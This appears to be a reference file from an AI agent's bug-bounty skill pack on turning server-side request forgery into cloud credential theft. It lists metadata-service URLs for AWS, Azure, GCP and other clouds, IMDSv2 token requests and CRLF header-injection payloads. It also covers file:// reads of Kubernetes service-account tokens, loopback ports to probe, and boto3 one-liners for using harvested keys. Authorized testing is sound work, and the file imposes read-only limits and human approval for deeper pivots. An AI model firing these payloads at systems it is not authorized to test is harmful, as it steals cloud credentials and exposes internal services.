# Cloud Metadata + Internal Reach — read the credential, that IS the proof

You have a sink that lands internal (raw, or via `bypass-ladder.md`). This
is where SSRF becomes payable. Reading a metadata credential is a **read-only, rung-1**
action on the shared safe-ladder — it is the deliverable, not a gray zone. Point the
fetch at the metadata service and the loopback app; capture what comes back.

> **This file is the single owner of the IMDS/metadata endpoint catalog and reach mechanics for the pack.** `../../cloud-exploitation/references/imds-metadata.md` keeps the honest IMDSv2-blind severity grading and the credential-use discipline; `../../rce-hunting/references/ssrf-to-rce.md` keeps the code-push→RCE escalation. Neither restates the endpoints.

## Contents

- AWS EC2 / ECS (IMDSv1; IMDSv2 token-then-creds; ECS task-role variant)
- Azure (IMDS — requires `Metadata:true` header)
- GCP (requires `Metadata-Flavor: Google`)
- DigitalOcean / Alibaba / Oracle / OpenStack
- Kubernetes / in-pod / loopback (often the richest reach)
- Fingerprint the environment from the response
- What to do with each harvested credential (safe-ladder)

The Next.js WebSocket-upgrade primitive (CVE-2026-44578, `cve-tooling.md`) is a
full-request primitive that can do the IMDSv2/GCP/Azure header dance in-band; a plain
`?url=` sink that cannot set method+headers is limited to IMDSv1-style GETs unless you
smuggle via gopher/CRLF.

---

## AWS EC2 / ECS

### IMDSv1 (single GET — works from any bare `?url=` sink)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/          # → <role-name>
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>    # → AccessKeyId, SecretAccessKey, Token
http://169.254.169.254/latest/user-data                                     # bootstrap scripts, often secrets
http://169.254.169.254/latest/dynamic/instance-identity/document            # account id, region, instance
```
The creds JSON has `AccessKeyId` / `SecretAccessKey` / `Token` + `Expiration`. That
read is the finding.

### IMDSv2 (token-then-creds — needs a header-capable primitive)
IMDSv2 requires a session token from a `PUT`, then the token on the GET:
```
PUT http://169.254.169.254/latest/api/token
    X-aws-ec2-metadata-token-ttl-seconds: 21600          # → <TOKEN>
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
    X-aws-ec2-metadata-token: <TOKEN>
```
Reachable only when the SSRF lets you set method + headers: `gopher://` (craft the raw
`PUT` then a second `GET`), a full-request primitive (CVE-2026-44578 upgrade proxy),
or a stack that forwards your request method/headers to the metadata host. If you can
only GET and IMDSv2 is enforced, you get a **401 — you reached IMDS but got no creds**.
That proves reach, not compromise. **Grade an IMDSv2-blind 401 Low/Medium (reach only)**
and say so plainly; "I reached 169.254.169.254" is not a High until credentials or
secrets actually come back. Full grading table:
`../../cloud-exploitation/references/imds-metadata.md` "Converts?".

### ECS task-role variant
ECS containers expose creds at a relative-URI on `169.254.170.2`:
```
http://169.254.170.2/v2/credentials/<uuid>
http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}    # if you can read env via file:///proc/self/environ
```

## Azure (IMDS — requires `Metadata:true` header)
```
GET http://169.254.169.254/metadata/instance?api-version=2021-02-01
    Metadata: true
GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
    Metadata: true                                        # → access_token (ARM)
GET .../oauth2/token?...&resource=https://graph.microsoft.com/    # → Graph token (users/PII)
GET .../oauth2/token?...&resource=https://vault.azure.net/        # → Key Vault token (secrets)
```
No header control? Try CRLF injection to inject the header:
`http://169.254.169.254/metadata/instance?api-version=2021-02-01%0d%0aMetadata:true`.
The returned bearer goes to Graph/ARM/Key Vault — that is a mass-PII / infra escalator;
hand the token to `exposed-secrets` / `cloud-exploitation` for the read (rung-1: decode
the token, read its `aud`/`roles`, one non-PII call).

## GCP (requires `Metadata-Flavor: Google`)
```
GET http://metadata.google.internal/computeMetadata/v1/
    Metadata-Flavor: Google
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
    Metadata-Flavor: Google                               # → OAuth2 access_token
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
GET http://metadata.google.internal/computeMetadata/v1/project/project-id
GET .../computeMetadata/v1/instance/attributes/?recursive=true    # startup scripts, ssh keys, secrets
```
Older GCP allowed header-less reads via `?recursive=true` on legacy `v1beta1`; try
`http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`.
IP form: `169.254.169.254` also serves the GCP endpoint.

## DigitalOcean / Alibaba / Oracle / OpenStack
```
DigitalOcean   http://169.254.169.254/metadata/v1/          (and /metadata/v1.json — user-data, keys)
Alibaba Cloud  http://100.100.100.200/latest/meta-data/
Oracle OCI     http://169.254.169.254/opc/v1/instance/  and /opc/v2/... (v2 needs Authorization: Bearer Oracle)
OpenStack      http://169.254.169.254/openstack/latest/meta_data.json
Packet/Equinix http://metadata.packet.net/metadata
```

## Kubernetes / in-pod / loopback (often the richest reach)
- **Loopback bypasses the ingress**: `http://127.0.0.1:<app-port>/<admin-route>` hits
  the app on the pod, bypassing the auth-enforcing ingress → internal/admin routes and
  sibling services. E.g. `127.0.0.1/<internal-route>` returning 500 = the same app
  answering on loopback.
- **In-cluster services**: `https://kubernetes.default.svc/` (API), kubelet `:10250`
  (`/pods`, `/run` on old versions), `http://<svc>.<ns>.svc.cluster.local`.
- **SA token via file scheme** (if `file://` works):
  `file:///var/run/secrets/kubernetes.io/serviceaccount/token` (+ `/namespace`, `/ca.crt`).
- **AKS managed-identity NMI fingerprint**: a CRLF `%0d%0aMetadata:true` that returns
  `Request blocked by AAD Pod Identity NMI` confirms AKS + pod-identity.
- **Common sibling ports on loopback / internal**: Redis 6379, memcached 11211,
  Elasticsearch 9200, Postgres 5432, actuator/metrics (`/actuator/env`,
  `/actuator/heapdump`), internal admin APIs, `/debug/pprof`.

---

## Fingerprint the environment from the response

Even a blocked-creds reach yields signal: capture the **egress IP** (is it a cloud
range?) and any **trace headers** the backend appends to the outbound request and
leaks to your OOB — `traceparent`, `uber-trace-id`, `X-Envoy-Peer-Metadata-Id`,
`x-datadog-*`, and internal UAs (`node`, `Go-http-client`, `CPF`, `IPS/1.0`,
`Imagecore Service`). `X-Envoy-Peer-Metadata-Id` = k8s/Istio mesh; datadog headers =
Datadog-instrumented; the egress IP's ASN tells you AWS vs Azure vs GCP so you probe
the right metadata endpoint first.

## What to do with each harvested credential (safe-ladder)

> **Tooling:** the `aws` CLI is not installed, but **`boto3` is** (1.43.18) and it does the SigV4 signing — so there IS an equivalent, contrary to what this file used to say. Run any AWS call as `python3 -c "import boto3,json;print(json.dumps(boto3.client('<svc>').<operation>(), default=str))"` with `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` / `AWS_SESSION_TOKEN` exported. Install the CLI only if you want its ergonomics (`pipx install awscli`).

There is no `curl` equivalent for `sts`/`iam`/`s3`/`dynamodb` — every call requires
SigV4 request signing over the harvested `AccessKeyId`/`SecretAccessKey`/`SessionToken`.
Azure and GCP tokens are plain bearers, so those proofs need nothing but `curl` + `jq`.

1. **Prove it is live and over-privileged — read-only, rung 1.** AWS: run
   `aws sts get-caller-identity` (returns the role ARN — no data touched). Azure/GCP:
   decode the JWT, read `aud`/`roles`/`scp`, make one non-PII call
   (`GET /subscriptions` count, list your own project config).
2. **State scale by inference — rung 3.** "This role can read bucket X" once proven by
   listing keys is enough; do NOT dump the bucket or enumerate the whole account.
3. **Hand deeper pivoting to `cloud-exploitation`** — anything beyond it requires d0x's approval before execution (rung 5).
   IMDS creds → S3 / internal API is where SSRF becomes Critical, but the pivot itself
   crosses into other-tenant/data territory — do it under `cloud-exploitation`
   discipline, on UAT if RoE requires (rung 4).
4. **Never write.** No `PutObject`, no `CONFIG SET`, no resource creation on real infra.

Report the exact field you read (role name, the fact that creds/`Token` returned, the
Azure token `aud`) as the concrete internal reach — that is what the program pays for.
